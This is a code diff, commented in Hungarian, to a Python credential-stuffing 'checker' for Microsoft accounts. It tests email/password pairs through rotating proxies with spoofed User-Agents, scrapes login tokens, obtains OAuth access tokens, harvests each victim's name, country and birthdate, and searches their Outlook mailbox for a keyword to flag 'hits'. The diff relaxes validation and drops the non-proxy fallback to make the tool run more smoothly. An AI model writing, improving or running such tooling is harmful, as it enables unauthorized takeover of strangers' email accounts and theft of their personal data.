@@ -3,20 +3,22 @@ import uuid
 import json
 import re
 import time
-from fake_useragent import UserAgent
+import random
 from proxy_manager import proxy_manager
 
-_ua = UserAgent()
+# Fix User-Agentek
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+]
 
 PROXY_RETRIES = 5
 DIRECT_FALLBACK = False
 
 
 def generate_user_agent():
-    try:
-        return _ua.random
-    except:
-        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    return random.choice(USER_AGENTS)
 
 
 def checker_worker_single(email: str, password: str, keyword: str):
@@ -38,16 +40,6 @@ def checker_worker_single(email: str, password: str, keyword: str):
 
             time.sleep(0.1)
 
-    if DIRECT_FALLBACK:
-        session = requests.Session()
-        try:
-            result = _do_check(session, email, password, keyword)
-            return result
-        except Exception as e:
-            return {"status": "error", "reason": str(e)[:80]}
-        finally:
-            session.close()
-
     return {"status": "error", "reason": "All proxies failed"}
 
 
@@ -67,7 +59,7 @@ def _do_check(session, email, password, keyword):
             "Connection": "keep-alive",
             "Upgrade-Insecure-Requests": "1",
             "User-Agent": user_agent,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "return-client-request-id": "false",
             "client-request-id": str(uuid.uuid4()),
             "x-ms-sso-ignore-sso": "1",
@@ -88,24 +80,11 @@ def _do_check(session, email, password, keyword):
         response = session.get(url, headers=headers, allow_redirects=True, timeout=30)
         response_text = response.text
 
-        if len(response_text) < 5000:
-            return {"status": "error", "reason": "Response too short"}
+        # LAZA ELLENŐRZÉS - csak alapvető Microsoft marker
+        if "PPFT" not in response_text or "urlPost" not in response_text:
+            return {"status": "error", "reason": "No PPFT/urlPost"}
 
-        microsoft_markers = 0
-        if "login.microsoftonline.com" in response_text or "login.live.com" in response_text:
-            microsoft_markers += 1
-        if "PPFT" in response_text:
-            microsoft_markers += 1
-        if "urlPost" in response_text:
-            microsoft_markers += 1
-        if "sCtx" in response_text:
-            microsoft_markers += 1
-        if "sFTTag" in response_text:
-            microsoft_markers += 1
-
-        if microsoft_markers < 3:
-            return {"status": "error", "reason": "Not real Microsoft page"}
-
+        # PPFT kinyerése
         PPFT = ""
         urlPost = ""
 
@@ -118,12 +97,11 @@ def _do_check(session, email, password, keyword):
                 server_data = json.loads(server_data_json)
                 sFTTag = server_data.get('sFTTag', '')
                 if sFTTag:
-                    ppft_pattern = r'value="([^"]+)"'
-                    ppft_match = re.search(ppft_pattern, sFTTag)
+                    ppft_match = re.search(r'value="([^"]+)"', sFTTag)
                     if ppft_match:
                         PPFT = ppft_match.group(1)
                 urlPost = server_data.get('urlPost', '')
-            except json.JSONDecodeError:
+            except:
                 pass
 
         if not PPFT:
@@ -135,17 +113,14 @@ def _do_check(session, email, password, keyword):
                 PPFT = response_text[start_index:end_index] if end_index != -1 else ""
 
         if not urlPost:
-            urlpost_pattern = r'"urlPost":"([^"]+)"'
-            urlpost_match = re.search(urlpost_pattern, response_text)
+            urlpost_match = re.search(r'"urlPost":"([^"]+)"', response_text)
             if urlpost_match:
                 urlPost = urlpost_match.group(1)
 
-        if not PPFT or len(PPFT) < 200:
-            return {"status": "error", "reason": "Invalid PPFT"}
+        if not PPFT or not urlPost:
+            return {"status": "error", "reason": "No PPFT/urlPost"}
 
-        if not urlPost or "login.live.com" not in urlPost:
-            return {"status": "error", "reason": "Invalid urlPost"}
-
+        # POST
         cookies_dict = session.cookies.get_dict()
         MSPRequ = cookies_dict.get('MSPRequ', '')
         uaid_cookie = cookies_dict.get('uaid', '')
@@ -168,7 +143,7 @@ def _do_check(session, email, password, keyword):
         headers_post = {
             "User-Agent": user_agent,
             "Pragma": "no-cache",
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
             "Host": "login.live.com",
             "Connection": "keep-alive",
             "Content-Length": str(len(data_string)),
@@ -196,52 +171,37 @@ def _do_check(session, email, password, keyword):
         post_text = post_response.text if post_response.text else ""
         cookies_dict = session.cookies.get_dict()
 
+        # AUTH COOKIE ELLENŐRZÉS - LAZA
         auth_cookie = cookies_dict.get("__Host-MSAAUTHP", "")
 
         if not auth_cookie:
-            is_real_error = (
-                "sErrTxt" in post_text or
-                "Your account or password is incorrect" in post_text or
-                "Sign in" in post_text or
-                "PPFT" in post_text or
-                "urlPost" in post_text
-            )
-
-            if is_real_error and len(post_text) > 5000:
+            # Valódi hibaüzenet keresése
+            if "sErrTxt" in post_text or "incorrect" in post_text.lower() or "error" in post_text.lower():
                 return {"status": "bad", "reason": "Wrong password"}
             else:
-                return {"status": "error", "reason": "No auth cookie, suspicious response"}
+                return {"status": "error", "reason": "No auth cookie"}
 
-        if len(auth_cookie) < 100:
-            return {"status": "error", "reason": "Fake auth cookie"}
-
+        # Auth code kinyerése
         auth_code = ""
         if post_response.status_code in [301, 302, 303, 307, 308]:
             redirect_url = post_response.headers.get('Location', '')
             if redirect_url and 'msauth://' in redirect_url and 'code=' in redirect_url:
-                code_part = redirect_url.split('code=')[1].split('&')[0]
-                if len(code_part) > 100:
-                    auth_code = code_part
+                auth_code = redirect_url.split('code=')[1].split('&')[0]
         else:
-            redirect_pattern = r'window\.location\s*=\s*["\']([^"\']+)["\']'
-            redirect_match = re.search(redirect_pattern, post_text)
+            redirect_match = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', post_text)
             if redirect_match:
                 redirect_url = redirect_match.group(1)
                 if 'msauth://' in redirect_url and 'code=' in redirect_url:
-                    code_part = redirect_url.split('code=')[1].split('&')[0]
-                    if len(code_part) > 100:
-                        auth_code = code_part
+                    auth_code = redirect_url.split('code=')[1].split('&')[0]
 
         CID = cookies_dict.get('MSPCID', '')
         if CID:
             CID = CID.upper()
 
-        if not CID or len(CID) < 10:
-            return {"status": "error", "reason": "Invalid CID"}
-
         if not auth_code:
-            return {"status": "error", "reason": "No valid auth code"}
+            return {"status": "error", "reason": "No auth code"}
 
+        # Token kérés
         access_token = ""
         url_token = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
         data_token = {
@@ -262,23 +222,16 @@ def _do_check(session, email, password, keyword):
             if token_response.status_code == 200:
                 token_data = token_response.json()
                 access_token = token_data.get("access_token", "")
-
-                if len(access_token) < 500:
-                    return {"status": "error", "reason": "Invalid access token"}
-
-                if access_token.count('.') != 2:
-                    return {"status": "error", "reason": "Malformed access token"}
         except:
             return {"status": "error", "reason": "Token request failed"}
 
         if not access_token:
             return {"status": "error", "reason": "No access token"}
 
+        # Profile kérés
         Name = ""
         Country = ""
         Birthdate = "N/A"
-        Total = "NO"
-        Date = "N/A"
 
         profile_url = "https://substrate.office.com/profileb2/v2.0/me/V1Profile"
         profile_headers = {
@@ -287,7 +240,7 @@ def _do_check(session, email, password, keyword):
             "Accept": "application/json",
             "ForceSync": "false",
             "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}",
+            "X-AnchorMailbox": f"CID:{CID}" if CID else "",
             "Host": "substrate.office.com",
             "Connection": "Keep-Alive",
             "Accept-Encoding": "gzip",
@@ -295,36 +248,28 @@ def _do_check(session, email, password, keyword):
 
         try:
             pRes = requests.get(profile_url, headers=profile_headers, timeout=30)
+            if pRes.status_code == 200:
+                try:
+                    profile_data = pRes.json()
+                    if "accounts" in profile_data and profile_data["accounts"]:
+                        first_account = profile_data["accounts"][0]
+                        Country = first_account.get("location", "")
+                        BD = first_account.get("birthDay", "")
+                        BM = first_account.get("birthMonth", "")
+                        BY = first_account.get("birthYear", "")
+                        if BD and BM and BY:
+                            Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
+                    if "names" in profile_data and profile_data["names"]:
+                        first_name = profile_data["names"][0]
+                        Name = first_name.get("displayName", "")
+                except:
+                    pass
+        except:
+            pass
 
-            if pRes.status_code != 200:
-                return {"status": "error", "reason": f"Profile API error {pRes.status_code}"}
-
-            profile_text = pRes.text
-            if len(profile_text) < 100:
-                return {"status": "error", "reason": "Profile response too short"}
-
-            try:
-                profile_data = pRes.json()
-            except:
-                return {"status": "error", "reason": "Invalid profile JSON"}
-
-            if "accounts" not in profile_data and "names" not in profile_data:
-                return {"status": "error", "reason": "Not a real profile response"}
-
-            if "accounts" in profile_data and profile_data["accounts"]:
-                first_account = profile_data["accounts"][0]
-                Country = first_account.get("location", "")
-                BD = first_account.get("birthDay", "")
-                BM = first_account.get("birthMonth", "")
-                BY = first_account.get("birthYear", "")
-                if BD and BM and BY:
-                    Birthdate = f"{BY}-{str(BM).zfill(2)}-{str(BD).zfill(2)}"
-            if "names" in profile_data and profile_data["names"]:
-                first_name = profile_data["names"][0]
-                Name = first_name.get("displayName", "")
-
-        except requests.exceptions.RequestException:
-            return {"status": "error", "reason": "Profile request failed"}
+        # Email search
+        Total = "NO"
+        Date = "N/A"
 
         search_url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
         search_payload = {
@@ -377,7 +322,7 @@ def _do_check(session, email, password, keyword):
             "Accept": "application/json",
             "ForceSync": "false",
             "Authorization": f"Bearer {access_token}",
-            "X-AnchorMailbox": f"CID:{CID}",
+            "X-AnchorMailbox": f"CID:{CID}" if CID else "",
             "Host": "substrate.office.com",
             "Connection": "Keep-Alive",
             "Accept-Encoding": "gzip",
@@ -393,26 +338,26 @@ def _do_check(session, email, password, keyword):
             if search_response.status_code == 200:
                 search_text = search_response.text
 
-                if len(search_text) >= 50:
-                    date_start = search_text.find('"LastModifiedTime":"')
-                    if date_start != -1:
-                        date_start += len('"LastModifiedTime":"')
-                        date_end = search_text.find('"', date_start)
-                        raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
-                        if raw_date != "N/A":
-                            Date = raw_date.replace("T", " ")[:16]
+                date_start = search_text.find('"LastModifiedTime":"')
+                if date_start != -1:
+                    date_start += len('"LastModifiedTime":"')
+                    date_end = search_text.find('"', date_start)
+                    raw_date = search_text[date_start:date_end] if date_end != -1 else "N/A"
+                    if raw_date != "N/A":
+                        Date = raw_date.replace("T", " ")[:16]
 
-                    total_start = search_text.find('"Total":')
-                    if total_start != -1:
-                        total_start += len('"Total":')
-                        total_end = search_text.find(',', total_start)
-                        if total_end == -1:
-                            total_end = search_text.find('}', total_start)
-                        Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
+                total_start = search_text.find('"Total":')
+                if total_start != -1:
+                    total_start += len('"Total":')
+                    total_end = search_text.find(',', total_start)
+                    if total_end == -1:
+                        total_end = search_text.find('}', total_start)
+                    Total = search_text[total_start:total_end].strip() if total_end != -1 else "NO"
         except:
             pass
 
-        if Total != "0" and Total != "NO":
+        # EREDMÉNY
+        if Total != "0" and Total != "NO" and Total != "":
             return {
                 "status": "hit",
                 "data": {
